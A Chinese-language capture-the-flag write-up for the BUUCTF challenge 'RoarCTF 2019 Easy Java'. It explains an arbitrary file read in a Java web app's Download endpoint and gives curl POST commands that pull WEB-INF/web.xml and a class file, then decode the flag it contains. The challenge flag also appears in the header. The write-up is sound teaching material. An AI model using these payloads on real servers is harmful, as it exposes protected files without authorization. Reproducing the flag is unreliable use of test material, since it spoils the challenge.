---
title: "[RoarCTF 2019]Easy Java"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [java-web, arbitrary-file-read, web-inf, class-file-analysis, base64-decode]
vulnerability: Java Web 应用任意文件读取漏洞，通过 POST 方式下载 WEB-INF 目录下的敏感文件
solved: true
flag: "flag{51c4f5e7-6908-4b0c-a0ee-5737d511d64e}"
---

# [RoarCTF 2019]Easy Java

## 题目概述
题目是一个 Java Web 应用，提供登录功能和文件下载功能。页面包含一个登录表单和一个 help 文件下载链接。

## 信息收集
1. 访问题目页面，发现是 Java Web 应用（从错误信息 `java.io.FileNotFoundException` 可判断）
2. 页面有一个下载链接 `Download?filename=help.docx`
3. 使用 GET 请求下载时返回错误，使用 POST 请求可成功下载文件
4. 通过 POST 方式读取 `WEB-INF/web.xml` 获取应用结构

## 漏洞分析（漏洞类型、原理、判断过程）
**漏洞类型**：Java Web 任意文件读取

**原理**：
- Java Web 应用的 `WEB-INF` 目录是受保护目录，浏览器无法直接访问
- 但通过应用的下载功能，可以绕过限制读取 `WEB-INF` 下的敏感文件
- 关键发现：下载接口只接受 POST 请求，GET 请求会返回错误

**判断过程**：
1. GET 请求 `Download?filename=help.docx` 返回 `FileNotFoundException`
2. POST 请求成功下载文件，说明存在任意文件读取漏洞
3. 读取 `WEB-INF/web.xml` 发现 FlagController 类的存在

## 利用过程（Payload + Flag）

**步骤 1：读取 web.xml 获取应用结构**
```bash
curl -s -X POST "http://target/Download" -d "filename=WEB-INF/web.xml"
```

发现 FlagController 类路径：`com.wm.ctf.FlagController`

**步骤 2：下载 FlagController.class 文件**
```bash
curl -s -X POST "http://target/Download" -d "filename=WEB-INF/classes/com/wm/ctf/FlagController.class" -o FlagController.class
```

**步骤 3：从 class 文件中提取 flag**
```bash
strings FlagController.class
# 发现 Base64 字符串: ZmxhZ3s1MWM0ZjVlNy02OTA4LTRiMGMtYTBlZS01NzM3ZDUxMWQ2NGV9Cg==

echo "ZmxhZ3s1MWM0ZjVlNy02OTA4LTRiMGMtYTBlZS01NzM3ZDUxMWQ2NGV9Cg==" | base64 -d
# flag{51c4f5e7-6908-4b0c-a0ee-5737d511d64e}
```

## 复现步骤
1. 访问题目页面，发现下载功能
2. 使用 POST 方式请求 Download 接口
3. 读取 `WEB-INF/web.xml` 获取 Servlet 配置
4. 下载 `WEB-INF/classes/com/wm/ctf/FlagController.class`
5. 使用 strings 命令提取 class 文件中的字符串
6. Base64 解码获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| 任意文件读取 | Download 接口 | `filename=WEB-INF/classes/com/wm/ctf/FlagController.class` | Java Web 目录结构、class 文件分析 |

## 知识总结（解题技巧、同类题型套路）

1. **Java Web 敏感目录**：`WEB-INF/web.xml`、`WEB-INF/classes/` 是常见的敏感目录
2. **请求方法差异**：某些接口可能只接受特定 HTTP 方法（本题为 POST）
3. **class 文件分析**：使用 `strings` 命令可以快速提取 class 文件中的字符串常量
4. **Base64 编码**：Java 字符串常量池中的 Base64 字符串可能是敏感信息
